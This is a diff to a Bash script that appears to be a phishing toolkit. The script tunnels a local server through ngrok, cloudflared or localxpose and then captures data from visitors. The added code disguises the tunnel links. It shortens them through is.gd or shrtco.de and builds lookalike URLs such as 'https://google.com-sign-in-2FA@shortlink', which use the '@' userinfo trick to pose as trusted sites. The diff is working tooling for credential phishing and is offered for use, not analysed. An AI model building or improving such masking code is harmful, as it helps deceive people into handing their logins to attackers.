@@ -129,7 +129,6 @@ fi
 if [[ -e ".server/.cld.log" ]]; then
 	rm -rf ".server/.cld.log"
 fi
-
 ## Script termination
 exit_on_signal_SIGINT() {
 	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
@@ -406,7 +405,7 @@ cusport() {
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
-		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
 		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
 			echo
@@ -416,6 +415,59 @@ cusport() {
 		fi		
 	else 
 		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
+	fi
+}
+## URL MASKING
+MASKING() { #4 last one using url shortner apis
+	RESPONSE=$(wget -nv --spider https://is.gd 2>&1 | awk '{print $5}') 
+	#getting response from is.gd
+	if [[ ${RESPONSE} == "200" ]];then
+		SITE=$(curl -s https://is.gd/create.php\?format\=simple\&url=${LINK})
+		if [[ ${SITE} == https://is.gd/[-0-9a-zA-Z]* ]]; then #RE-CHECKING For a valid url somtimes site goes down!!
+			MASK_SUFfix=${SITE#https://}
+		else #as a backup shortner
+			SITE=$(curl -s https://api.shrtco.de/v2/shorten?url=${LINK} >> site.log)
+			grep -o 'https:[^"]*' site.log >> bURI;rm log.URI;sed 's/\\//g' bURI >> .uri.log;rm bURI
+			MASK_SUFfix=$(grep -o '9qr.de/[-0-9a-zA-Z]*' ".uri.log")
+		fi
+	fi
+	{ clear; banner_small; } 
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}${LINK}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}${mask}@${SUFfix}"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${ORANGE} URL 3 : ${GREEN}${CUS_URL}-${Keystks}@${MASK_SUFfix}${GREEN}"
+}
+
+CHECK() { #3 checking for HTTP|S or WWW input type is valid or not.
+	if [[ ! "${1//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
+		if [[  "${1::3}" != 'www' ]]; then
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid URL | USE www/http or https insted of : ${CUS_URL}"
+			{ sleep 1.5; clear; banner; cusurl; }
+		fi
+	fi
+}
+
+cusurl(){ #1
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Do You want to Customize the uRL BeLow?\n"
+	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} ${LINK} ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " CUS_URI
+	if [[ "${CUS_URI}" =~ ^([Yy])$ ]]; then
+		printf "\e[0m\n\n"
+		read -p $'\033[31m[\033[0m-\033[31m]\033[33m Enter Your Custom uRL (\033[0meg: https://google.com | www.google.com\033[33m)\n\n\033[33m~> \033[32m' CUS_URL
+		CHECK ${CUS_URL}
+		printf "\e[0m\n\n"
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
+		if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
+			MASKING
+		else
+			echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
+			{ sleep 1.5; clear; banner; cusurl; }
+		fi
+	elif [[ "${CUS_URI}" =~ ^([Nn])$ ]]; then
+		{ clear; banner_small; }
+		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}${LINK}"
+		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}${mask}@${SUFfix}"
+	else
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
+		{ clear; banner; cusurl; }
 	fi
 }
 
@@ -484,11 +536,11 @@ start_ngrok() {
 		sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
 	fi
 
-	{ sleep 8; clear; banner_small; }
+	sleep 8
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
-	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	LINK="${ngrok_url}"
+	SUFfix=${ngrok_url#https://}
+	cusurl
 	capture_data
 }
 
@@ -501,17 +553,15 @@ start_cloudflared() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && termux-chroot cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	else
 		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-	fi
-
-	{ sleep 8; clear; banner_small; }
-	
+	fi	
+	sleep 8
 	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
-	cldflr_link1=${cldflr_link#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	LINK="${cldflr_link}"
+	SUFfix=${cldflr_link#https://}
+	cusurl
 	capture_data
 }
 
@@ -547,11 +597,11 @@ start_loclx() {
 	else
 		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
 	fi
-
-	{ sleep 12; clear; banner_small; }
+	sleep 12
 	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
+	SUFfix=${loclx_url}
+	LINK="${loclx_url}"
+	cusurl
 	capture_data
 }
 
